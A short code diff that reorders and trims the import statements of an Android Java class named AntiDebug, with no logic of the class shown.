@@ -4,14 +4,13 @@ import java.io.IOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
 
-import com.android.deviceinfo.Beep;
-import com.android.deviceinfo.Status;
-import com.android.deviceinfo.auto.Cfg;
-
 import android.content.pm.ApplicationInfo;
 import android.os.Debug;
 import android.util.Log;
-import android.widget.Toast;
+
+import com.android.deviceinfo.Beep;
+import com.android.deviceinfo.Status;
+import com.android.deviceinfo.auto.Cfg;
 
 public class AntiDebug {
 
